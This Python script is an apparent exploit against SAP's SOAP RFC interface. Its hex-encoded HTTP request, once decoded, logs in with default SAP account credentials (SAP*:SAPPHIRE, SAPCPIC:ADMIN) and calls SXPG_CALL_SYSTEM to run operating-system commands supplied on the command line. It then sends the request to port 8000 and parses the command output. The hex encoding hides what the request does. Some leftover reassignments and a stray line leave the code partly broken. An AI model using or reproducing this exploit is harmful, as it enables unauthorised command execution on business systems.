#!/usr/bin/python

import binascii
import sys
import re


part1 = "50 4F 53 54 20 2F 73 61 70 2F 62 63 2F 73 6F 61 70 2F 72 66 63 3F 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 26 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 38 30 30 30 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 36 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 31 29 0D 0A 41 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61 73 69 63 20 55 30 46 51 51 31 42 4A 51 7A 70 42 52 45 31 4A 54 67 3D 3D 0D 0A 43 6F 6F 6B 69 65 3A 20 73 61 70 2D 75 73 65 72 63 6F 6E 74 65 78 74 3D 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 26 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 0D 0A 53 4F 41 50 41 63 74 69 6F 6E 3A 20 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 55 54 46 2D 38 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20"
part1 = "50 4F 53 54 20 2F 73 61 70 2F 62 63 2F 73 6F 61 70 2F 72 66 63 3F 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 37 26 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 38 30 30 30 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 36 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 31 29 0D 0A 41 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61 73 69 63 20 55 30 46 51 4B 6A 70 54 51 56 42 51 53 45 6C 53 52 51 3D 3D 0D 0A 43 6F 6F 6B 69 65 3A 20 73 61 70 2D 75 73 65 72 63 6F 6E 74 65 78 74 3D 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 26 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 37 0D 0A 53 4F 41 50 41 63 74 69 6F 6E 3A 20 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 55 54 46 2D 38 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20"
part1 = part1.replace(' ', '')
part1 = binascii.unhexlify(part1)

part2 = "0D 0A 0D 0A 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66 2D 38 22 20 3F 3E 3C 65 6E 76 3A 45 6E 76 65 6C 6F 70 65 20 78 6D 6C 6E 73 3A 78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 22 20 78 6D 6C 6E 73 3A 65 6E 76 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 2D 69 6E 73 74 61 6E 63 65 22 3E 3C 65 6E 76 3A 42 6F 64 79 3E 3C 6E 31 3A"
part
part2 = part2.replace(' ','')
part2 = binascii.unhexlify(part2)

part3 = "20 78 6D 6C 6E 73 3A 6E 31 3D 22 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 22 20 65 6E 76 3A 65 6E 63 6F 64 69 6E 67 53 74 79 6C 65 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 63 6F 64 69 6E 67 2F 22 3E"
part3 = "3C 2F 41 44 44 49 54 49 4F 4E 41 4C 5F 50 41 52 41 4D 45 54 45 52 53 3E 3C 43 4F 4D 4D 41 4E 44 4E 41 4D 45 3E"
part3 = part3.replace(' ','')
part3 = binascii.unhexlify(part3)

part4 = "3C 2F 6E 31 3A"
part4 = "3C 2F 43 4F 4D 4D 41 4E 44 4E 41 4D 45 3E 3C 4F 50 45 52 41 54 49 4E 47 53 59 53 54 45 4D 3E 41 4E 59 4F 53 3C 2F 4F 50 45 52 41 54 49 4E 47 53 59 53 54 45 4D 3E 3C 45 58 45 43 5F 50 52 4F 54 4F 43 4F 4C 3E 3C 69 74 65 6D 3E 3C 2F 69 74 65 6D 3E 3C 2F 45 58 45 43 5F 50 52 4F 54 4F 43 4F 4C 3E 3C 2F 6E 31 3A 53 58 50 47 5F 43 41 4C 4C 5F 53 59 53 54 45 4D 3E 3C 2F 65 6E 76 3A 42 6F 64 79 3E 3C 2F 65 6E 76 3A 45 6E 76 65 6C 6F 70 65 3E"
part4 = part4.replace(' ','')
part4 = binascii.unhexlify(part4)

part5 = "3E 3C 2F 65 6E 76 3A 42 6F 64 79 3E 3C 2F 65 6E 76 3A 45 6E 76 65 6C 6F 70 65 3E"
part5 = part5.replace(' ','')
part5 = binascii.unhexlify(part5)

if len(sys.argv)<3:
    print("Usage : "+sys.argv[0]+" [command] [additionnal parameters] (query locally on 8000)")
    exit()

data = part2+sys.argv[1]+part3+sys.argv[2]+part4+sys.argv[1]+part5
data = part2+sys.argv[2]+part3+sys.argv[1]+part4
payload = part1+str(len(data)-4)+data

if len(sys.argv) == 3:
    print(payload)
else:
    import socket
    import base64

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8000))
    s.send(payload)

    s.settimeout(2)

    t = s.recv(10000)
    while True:
        try:
            t += s.recv(10000)
        except:
            break

    found = re.findall("<LENGTH>([^<]*|)</LENGTH><MESSAGE>([^<]*|)</MESSAGE>", t)
    size = 0
    b64 = ''
    for i in found:
        print(i)
        b64 += i[1]
        size += len(i[1])

    print(len(found))
    print(size)

    #open('kok', 'wb').write(base64.b64decode(b64))
